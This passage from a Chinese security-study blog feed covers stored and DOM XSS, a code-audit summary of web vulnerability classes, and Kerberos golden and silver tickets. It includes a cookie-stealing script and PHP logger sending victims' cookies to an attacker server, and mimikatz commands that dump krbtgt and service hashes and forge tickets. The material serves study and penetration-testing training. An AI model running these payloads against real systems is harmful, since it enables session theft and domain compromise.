&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在上面代码中，获取POST参数mtxMessage和txtName，然后将将参数插入到数据库的表中，并显示到页面上。页面的功能是获取用户名字和内容并插入到数据库中，如果我们输入恶意代码，那么也会插入到数据库中，只有用户访问这个页面，那么恶意代码就会执行。</p><h5 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss"></a> DOM型XSS</h5><p>反射型和储存型XSS漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据返回给用户。DOM型XSS没有这种特点，在这种漏洞中，攻击者的JavaScript通过下面方式提交。</p><p>1,用户请求一个经过专门设计的URL，它由攻击者提交，并且其中包含嵌入式JavaScript。</p><p>2,服务器的响应中并不以任何形式包含攻击者的代码。</p><p>3,当用户的浏览器处理这个响应时，上述脚本得以处理。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document  object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><h5 id="cookie盗取"><a class="markdownIt-Anchor" href="#cookie盗取"></a> cookie盗取</h5><p>首先找到一个存在XSS漏洞的点，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后可以自己利用phpstudy创建一个网站，在根目录下创建一个any.php文件，添加代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]; <span class="comment">//获取cookie</span></span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>,<span class="variable">$cookie</span>.<span class="string">&quot;\n&quot;</span>); <span class="comment">//写入文件并保存</span></span><br><span class="line">fclose(<span class="variable">$log</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再存在XSS的位置输入：</p><script>document.location='http://你的IP/any.php?cookie='+document.cookie;</script><p>受攻击的服务器的cookie信息就会发送到攻击者的服务器并保存。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;xss简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss简介&quot;&gt;&lt;/a&gt; XSS简介&lt;/h5&gt;
&lt;p&gt;跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码(一般是JS代码)到正常用户会访问</summary>
      
    
    
    
    
    <category term="xss 渗透测试" scheme="http://example.com/tags/xss-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>《代码审计：企业级web代码安全架构》学习总结（一）</title>
    <link href="http://example.com/2021/09/19/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://example.com/2021/09/19/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-09-19T15:51:33.000Z</published>
    <updated>2021-09-19T15:52:06.815Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一-通用代码审计思路"><a class="markdownIt-Anchor" href="#一-通用代码审计思路"></a> 一、通用代码审计思路</h3><p>(1): 敏感关键字回溯参数传递过程</p><p>(2): 查找可控变量，正向追踪变量传递过程</p><p>(3): 寻找敏感功能点，通读功能点代码</p><p>(4): 全文代码通读</p><h5 id="1-敏感函数回溯参数过程"><a class="markdownIt-Anchor" href="#1-敏感函数回溯参数过程"></a> 1、敏感函数回溯参数过程</h5><p>​<strong>要形成漏洞的条件是1）可控变量、2）危险函数</strong></p><p>​例如SQL漏洞，关键字有select ,insert等，再结合from,where等关键字，我们可以判断是不是一条sql语句，再根据sql注入相关的条件，看看是不是有危险参数传入。</p><p>​这种方法有点是速度快，但是在对漏洞定位利用会花费更多的时间，对逻辑漏洞挖掘覆盖不到。</p><h5 id="2-通读全文代码"><a class="markdownIt-Anchor" href="#2-通读全文代码"></a> 2、通读全文代码</h5><p>​首先是要关注程序的目录结构，特别注意：</p><ul><li>函数集文件（通常名字里带function，common等关键字）</li><li>配置文件（名中可能带config）</li><li>安全过滤文件（带有filter,safe,check等）</li><li>index文件</li></ul><h5 id="3-根据功能点定向审计"><a class="markdownIt-Anchor" href="#3-根据功能点定向审计"></a> 3、根据功能点定向审计</h5><ul><li><p>文件上传功能</p><p>例如，文章编辑，资料编辑，头像上传，附件上传等等。</p></li><li><p>文件管理功能</p><p>程序将文件名或者文件路径直接在参数中传递，则会造成任意文件操作漏洞，例如文件读取就是在路径中使用…/或者…\跳转</p></li><li><p>登录认证功能</p><p>目前的认证方式大多数是基于cookie和session，一些程序为了用户体验，保持较长时间的登录，就会直接从cookie中读取用户信息，这时，cookie的加密算法是不是可信就是个问题，若cookie加密时没有加salt一类的东西，就容易导致任意用户登录漏洞或与越权漏洞。</p></li><li><p>找回密码功能</p></li></ul><hr /><h3 id="二-漏洞挖掘"><a class="markdownIt-Anchor" href="#二-漏洞挖掘"></a> 二、漏洞挖掘</h3><h5 id="1-sql注入"><a class="markdownIt-Anchor" href="#1-sql注入"></a> 1、SQL注入</h5><p>​一般SQL注入经常出现在登录页面，获取http头，订单处理等地方，另外在订单系统里涉及的交互较多，容易造成二次注入。</p><p>​**普通注入：**指通过注入union查询可以直接查询数据库，一般的SQL注入工具可以很好的利用。在审计是可以多关注如select from, mysql_connect, mysql_query等，数据库查询方式还有update,insert,delete。</p><p>​<strong>编码注入：</strong></p><ul><li><p>宽字节注入</p><p>当设置“set character_set_client = gbk”时会导致一个编码转换的注入问题，例如当我们的注入参数里带有%df%27时，会将过滤函数加上的\(也就是%5c)“吃掉”，形成一个新的字符绕过过滤。</p></li><li><p>二次urldecode注入</p><p>原理是我们将参数提交到webserver时，webserver会自动解码一次，例如目标开起了gpc，我们提交?id=1%2527，因为我们提交的参数里没有单引号，所以会被解码，%25的解码效果是%，解码后的结果是1%27。此时程序内要是使用了urlcode或者rawurldecode函数来解码id参数，解码结果是?id=1’。在审计时可以通过搜索urldecode和rawurldecode函数来挖掘漏洞。</p><p><strong>漏洞防范：</strong></p></li><li><p>gpc/runtime魔术引号</p><p>针对单引号，双引号，反斜杠及空字符NULL进行过滤，但是在int型的注入上没有多大作业</p></li><li><p>addslashes函数</p><p>与GPC作用一样，常用于函数开头首先检验是否开启GPC。</p></li><li><p>mysql_real_escape_string函数</p></li><li><p>intval等字符转换</p><p>主要针对int型注入</p></li><li><p>预编译</p></li></ul><hr /><p><strong>2、XSS漏洞</strong></p><p>​寻找xss漏洞的关键是寻找没有被过滤的参数，且参数传入到输出函数如print、print_r、echo、printf、die、var_dump等</p><p>​    <strong>漏洞防范：</strong></p><p>​在输出和调用时通过HTML实体编码防止脚本注入</p><p><strong>3、CSRF漏洞</strong></p><p>​针对CSRF漏洞，黑盒测试时，可以打开几个页面，抓包看看有没有token，去掉referer，如果返回的数据还是一样的就可能有漏洞。审计时，我们需要查看几个核心代码文件、被大量引用的文件有没有带验证token和referer的代码</p><p>​<strong>漏洞防范：</strong></p><ul><li>增加token、referer验证</li><li>增加验证码</li></ul><hr /><p><strong>4、文件操作漏洞</strong></p><p>​文件操作漏洞又分为本地文件包含，远程文件包含。函数有：include()、include_once()、require()、require_once()。他们之间的区别在于：include()、include_once()在包含文件时即使遇到错误，下面的代码仍然会执行；…而require()、require_once()则会直接报错退出程序。</p><p>​文件包含漏洞大多出现在模板加载，模块加载，cache调用等地方</p><p>​<strong>本地文件包含（LFI）：</strong></p><p>​LFI是指仅能包含本机文件的包含漏洞，比如上传一个允许上传的文件格式的文件，再包含来执行代码，包含PHP上传的临时文件、请求的URL或者UA内加入要执行的代码、webserver记录到日志后的日志等等</p><p>​<strong>远程文件包含（RFI）：</strong></p><p>​需要设置allow_url_include = ON，我们就可以直接在相应的请求内传入一个其他网站下的文件。</p><p>​文件包含截断：</p><p>​无法写入.php问件时</p><ul><li>%00截断： 参数后面跟一个%00就可以绕过过滤。但是GPC开启的情况下，失去作用</li><li>.和/截断： windows下 在文件名最后加240个“.”或者“/”截断，在linux下需要2038个/.组合才能截断（PHP5.3之前）</li><li>?截断：在url请求包含的文件最后添加？让server以为？后的内容是请求参数，如/1.txt? 因为在http内2.txt和2.txt?.php的访问结果是一样的</li></ul><p>​<strong>文件上传漏洞</strong></p><p>​在寻找文件上传漏洞时最好的是直接搜索move_uploaded_file()函数，再查看调用这个函数的相关函数是否存在对上传文件的格式限制或是能不能被绕过。</p><p>​较常见是未曾设置文件格式限制、黑名单扩展名绕过、文件头/content-type绕过</p><p>​<strong>漏洞防范：</strong></p><p>​文件操作漏洞有几个共同点如下：</p><p>​(1): 由越权操作引起的可以操作未授权操作的文件</p><p>​(2): 要操作更多的文件需要跳转目录</p><p>​(3): 大多是在请求中传入文件名</p><p>​针对这些特点：</p><p>​(1): 对权限的管理要合理。比如A用户上传的文件，其他平行权限的用户未授权时不能查看，特殊文件只 有特权用户才能查看，对文件的操作比如删除等只有管理员才能操作。</p><p>​(2): 有的文件操作是不需要传入文件名的，比如下载文件时，文件是已知的，我们可以使用参数来代替   文件名作为下载需要的参数。</p><p>​(3): 避免目录跳转问题，主要是通过对传入参数中的’…‘和’/‘以及’\'检查。</p><p>​(4): 针对文件上传，我们使用白名单的方式过滤扩展名。保存上传文件时，重命名文件比如用MD5值代   替。</p><hr /><p><strong>5、代码执行</strong></p><p>​由于程序本身过滤不严，用户可以直接通过请求将代码注入到应用中去执行。类似SQL注入漏洞代码会在SQL服务执行。最终注入的代码会在web server中执行。</p><p>代码执行函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> 和 assert:</span><br><span class="line">执行PHP代码</span><br><span class="line"></span><br><span class="line">preg_replace:</span><br><span class="line">perg_replace(a,b,c):在C中找到a， 用b替代。若b的末尾存在/e修饰，则会被当做代码执行</span><br><span class="line"></span><br><span class="line">call_user_func和array_map：</span><br><span class="line">call_user_func(a,b,c...):a表示要调用的函数，后面的表示a需要的参数</span><br><span class="line"></span><br><span class="line">动态函数执行：</span><br><span class="line">为了方便函数调用程序员自己定义的由字符串拼接成的函数</span><br><span class="line"></span><br><span class="line">thinkphp代码执行：</span><br><span class="line">GET参数以index.php/a/b/c的形式传递</span><br><span class="line">造成原因是PHP中<span class="string">&quot; &quot;</span>内的内容会被直接当做命令执行</span><br></pre></td></tr></table></figure><p>​<strong>漏洞防范：</strong></p><p>​使用参数白名单过滤，结合正则表达式来进行白名单过滤。</p><hr /><p><strong>6、命令执行</strong></p><p>​命令执行漏洞主要出现在包含环境包的应用里，一些直接在系统安装就可以启动自带的web服务和数据库服务，web应用会有比较多的点之间使用system(); exec(); shell_exec(); passthru(); popen(); proc_open()等函数执行命令调用一些需要的脚本。</p><p>​<strong>漏洞防范：</strong></p><p>​在命令上的防注入函数有：escapeshellcmd()和escapeshellarg()，前者是过滤整个命令，后者是过滤传入的参数。还有就是参数白名单。</p><hr /><p><strong>7、变量覆盖漏洞</strong></p><p>​利用我们自定义的参数来代替程序原有的变量值，结合程序的其他功能来实现攻击。常常是由于函数使用不当造成的，容易引发变量覆盖漏洞的函数有：extract()和parse_str()，而import_request_variables()函数主要是因为在没有开启全局变量注册的时候，调用了这个函数则相当于开启了全局注册变量，在PHP4.5之后这个函数被取消，另外还利用$$的方式注册变量没有去验证已有变量而导致的变量覆盖。</p><p>​寻找变量覆盖漏洞，首先要考虑能不否实现变量覆盖，即使可以实现，后续变量能不能被利用，在审计时可以直接寻找参数带变量的extract()和parse_str()函数和“$$”。</p><p><strong>函数使用不当：</strong></p><ul><li>extract()函数通过从数组中将变量导入到当前符号表，即将数组中的键值对注册成为变量。函数有三个参数其中能不能导致变量覆盖由第二个参数决定：函数能不能产生变量覆盖要看第二个参数extract_type,若为EXTR_OVERWRITE则覆盖变量；若只传入第一个变量的值则默认同上；若为EXTR_IF_EXISTS同上。</li><li>parse_str函数的是解析字符床并注册成为变量，在注册前不会验证变量是否存在，会直接覆盖掉原有的变量。两个参数a,b经过函数处理后，a里的键值对如a=1，会被处理成<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">并</mi><mi mathvariant="normal">放</mi><mi mathvariant="normal">进</mi><mi>b</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">若</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">有</mi></mrow><annotation encoding="application/x-tex">a = 1,并放进b数组中，若数组中有</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">放</span><span class="mord cjk_fallback">进</span><span class="mord mathdefault">b</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">若</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">有</span></span></span></span>a=2之类，则覆盖。</li></ul><p><strong>$$变量覆盖：</strong></p><p>​</p><p><strong>漏洞防范：</strong></p><p>​(1): 使用原始变量，常见的变量覆盖漏洞都是在变量注册的时候产生的，因此就不进行变量注册，仅使用原生的变量进行操作，必要的时候可以在代码中直接定义变量，再把请求中的值赋给他。</p><p>​(2): 验证变量存在，注册前先判断变量是不是存在，最重要的一点，自行申明的变量一定要初始化，不然即使注册变量代码在执行流程的最前面也会覆盖掉未初始化的变量。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一-通用代码审计思路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-通用代码审计思路&quot;&gt;&lt;/a&gt; 一、通用代码审计思路&lt;/h3&gt;
&lt;p&gt;(1): 敏感关键字回溯参数传递过程&lt;/p&gt;
&lt;p&gt;(2): 查找可控变量，正向追踪变量传递过程</summary>
      
    
    
    
    
    <category term="渗透测试学习" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>金银票据</title>
    <link href="http://example.com/2021/09/18/%E9%87%91%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
    <id>http://example.com/2021/09/18/%E9%87%91%E9%93%B6%E7%A5%A8%E6%8D%AE/</id>
    <published>2021-09-18T03:08:53.000Z</published>
    <updated>2021-09-18T11:54:42.851Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h3><p>关于黄金票据和白银票据的相关知识。</p><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>先看金银票据的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">黄金票据(Ticket-Granting-Ticket)：是直接抓取域控中ktbtgt账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。</span><br><span class="line"></span><br><span class="line">白银票据(Silver Ticket)：抓取到了域控服务hash的情况下，在client端以一个普通域用户的身份生成TGS票据，是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。</span><br></pre></td></tr></table></figure><p>总而言之，黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户，针对域内的所有用户。而白银票据则是伪造ST（门票），这样的好处是门票不会经过KDC，从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等</p><p>其中一些定义，接下来我们一一介绍：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">krbtgt用户: krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户</span><br><span class="line">TGT(Ticket-Granting-Ticket): 黄金票据</span><br><span class="line">ST(Silver Ticket): 白银票据</span><br><span class="line">Client: Application Client: 应用客户端</span><br><span class="line">TGS: Ticket-Granting Service: 用来授权服务访问</span><br><span class="line">KDC: Key Distribution Center: 秘钥分发中心</span><br></pre></td></tr></table></figure><h3 id="关于kerberos协议"><a class="markdownIt-Anchor" href="#关于kerberos协议"></a> 关于Kerberos协议</h3><p>大致流程如下：</p><p><a href="https://imgtu.com/i/4QbutJ"><img src="https://z3.ax1x.com/2021/09/18/4QbutJ.png" alt="4QbutJ.png" /></a></p><ol><li>Client向KDC发起AS_REQ请求内容为通过Client密码Hash 加密的时间戳、ClientID、网络地址、加密类型等内容</li><li>KDC使用Client hash进行解密，并在ntds.dit(只有域控中才有的数据库)中查找该账户，如果结果正确就返回用krbtgt NTLM-hash加密的TGT票据，TGT里面包含PAC（Privilege Attribute Certificate，不同的账号有不同的权限，PAC就是为了区别不同权限的一种方式），PAC包含Client的sid，Client所在的组</li><li>Client(客户端)凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</li><li>KDC使用krbtgt NTLM-hash进行解密，如果结果正确，就返回用服务NTLM-hash 加密的TGS票据，并带上PAC返回给Client(客户端)，这一步不管用户有没有访问服务的权限，只要TGT（认证票据）正确，就返回TGS票据</li><li>此时client拿着KDC给的TGS票据去请求服务</li><li>服务端使用自己的NTLM-hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限</li></ol><p>详细过程如下：</p><ul><li><p>用户登录：</p><p>用户登录阶段，通常由用户输入[用户名]和[密码]信息，客户端将用户输入的[密码]信息通过一个  单向Hash函数生成一个[Client密钥]</p></li><li><p>请求身份认证：</p><p>(1)：客户端为执行登录操作的用户向AS(Authentication Server 用来认证用户身份)发送认证请求，附带用户信息。</p><p>(2)：AS收到用户认证请求之后，根据请求中的[用户名]信息，从数据库中查找该用户名是否存在。<br />如果[用户名]存在，则对应的[密码]也可以从数据库中获取到。AS利用相同的单向Hash函数为[密码]生成一个秘钥，如果第1步中用户提供的[密码]信息正确，该秘钥与用户登录章节中的[Client密 钥]相同：</p><p>​此时返回响应消息：</p><p>​ Msg A 使用[Client密钥]加密的[Client/TGS SessionKey]<br />Msg B 使用[TGS密钥]加密的TGT(Ticket-Granting-Ticket)，因此该消息Client不可解析。<br />TGT中包含如下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Client/TGS SessionKey]</span><br><span class="line">Client ID</span><br><span class="line">Ticket有效时间</span><br><span class="line">Client网络地址</span><br></pre></td></tr></table></figure><pre><code>  Client收到AS的响应消息以后，利用自身的[Client密钥]可以对Msg A进行解密，这样可以获取到  [Client/TGS SessionKey]。但由于Msg B是使用[TGS密钥]加密的，Client无法对其解密。</code></pre></li><li><p>请求服务授权</p><p>(1): 客户端向TGS发送请求，请求授权。</p><p>包含两个信息：</p><p>​  Msg C：要请求的服务ID, 即[Service ID]；上一步2.2中由AS为Client提供的TGT。<br />Msg D：使用[Client/TGS SessionKey]加密的Authenticator 1 {Client ID, Timestamp}。</p><p>(2): TGS为Client响应服务授权票据</p><p>​  TGS为Client响应的消息包括：</p><p>​   Msg E 使用[Service密钥]加密的Client-To-Server Ticket, 该Ticket中包含了如下信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Client/Server SessionKey]</span><br><span class="line">Client网络地址</span><br><span class="line">Ticket有效时间</span><br><span class="line">Client IDMsg F 使用[Client/TGS SessionKey]加密的[Client/Server SessionKey]。</span><br></pre></td></tr></table></figure><p>​    Msg F 使用[Client/TGS SessionKey]加密的[Client/Server SessionKey]。</p><p>注意：</p><p>Msg E使用了[Service密钥]加密，该消息可视作是TGS给Service Server的消息，只不过由Client  一起携带。</p><p>Msg F使用了[Client/TGS SessionKey]加密，因此，该消息对Client可见。Client对其解密以后可 获取到[Client/Server SessionKey]。</p></li><li><p>发送服务请求</p><p>(1): Client向SS(Service Server)发送服务请求</p><p>发送的消息中包括：</p><p>Msg E 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。<br />Msg G 由[Client/Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。<br />注意：</p><p>[Client/Server SessionKey]并未直接透明传输，而是被包含在使用[Service密钥]加密的Msg E中。<br />既然[Client/Server SessionKey]并不直接透明传输， Client需要向SS证明自己拥有正确的[Client/Server SessionKey]，所以，Authenticator 2使用了[Client/Server SessionKey]加密。</p><p>(2): SS响应Client</p><p>SS收到客户端的服务请求之后，先利用自身的[Service密钥]对Msg E进行解密，提取出Client-To-Server Ticket, 在3.2步骤中，提到了该Ticket中包含了[Client/Server SessionKey]以及Client ID信息。<br />SS使用[Client/Server SessionKey]解密Msg G，提取Client ID信息，而后将该Client ID与Client-To-Server Ticket中的Client ID进行比对，如果匹配则说明Client拥有正确的[Client/Server SessionKey]。<br />而后，SS向Client响应Msg H(包含使用[Client/Server SessionKey]加密的Timestamp信息)。<br />Client收到SS的响应消息Msg H之后，再使用[Client/Server SessionKey]对其解密，提取Timestamp信息，然后确认该信息与Client发送的Authenticator 2中的Timestamp信息一致。</p></li></ul><h4 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h4><ul><li><p>黄金票据（Golden Ticket）</p><p>前提：</p><p>​拿到域控<br />​有krbtgt用户的hash值（借助mimikatzkatz）</p><p>要求：</p><p>​域名<br />​域的SID 值<br />​域的KRBTGT账户NTLM密码哈希<br />​伪造用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取域名</span></span><br><span class="line">whoami</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取SID</span></span><br><span class="line">whoami /all</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取域的KRBTGT账户NTLM密码哈希或者aes-256值</span></span><br><span class="line">lsadump::dcsync /domain:zz.com /user:krbtgt /csv</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 伪造管理员用户名</span></span><br><span class="line">net group &quot;domain admins&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 清除所有票据</span></span><br><span class="line">klist purge</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用mimikatz伪造指定用户的票据并注入到内存</span></span><br><span class="line">kerberos::golden  /admin:administrator  /domain:zz.com  /sid:S-1-5-21-1373374443-4003574425-2823219550  /krbtgt:9f3af6256e86408cb31169871fb36e60  /ptt</span><br></pre></td></tr></table></figure></li><li><p>白银票据</p><p>利用前提：</p><p>拿到目标机器hash(是目标机,不一定是域控)<br />条件要求：</p><p>域名<br />域sid<br />目标服务器FQDN<br />可利用的服务<br />服务账号的NTML HASH<br />需要伪造的用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取域名</span></span><br><span class="line">whoami</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取SID</span></span><br><span class="line">whoami /all</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 目标机器的hostname+域名 /target:\\\\WIN-75NA0949GFB.NOONE.com</span></span><br><span class="line">net time /domain  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可利用的服务CIFS(磁盘共享的服务)</span></span><br><span class="line"> /service:CIFS</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 要伪造的用户名</span></span><br><span class="line"> /user:Administrator</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务账号的ntlm <span class="built_in">hash</span>(Primary Username : WIN-75NA0949GFB$带$的<span class="built_in">hash</span>，不是admin的)</span></span><br><span class="line"> /rc4:08d93ddf15a6309a46daaa7ec8565296</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 利用文件共享服务cifs，获取服务账号(域控名)得NTMLhash值(在14068基础上使用mimikatz获取)</span></span><br><span class="line">mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt;&gt; 2.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 清除所有票据</span></span><br><span class="line">klist purge</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用mimikatz伪造指定用户的票据并注入到内存</span></span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:cifs /rc4:服务账号NTMLHASH /user:用户名 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h4 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h4><p>（1）限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active 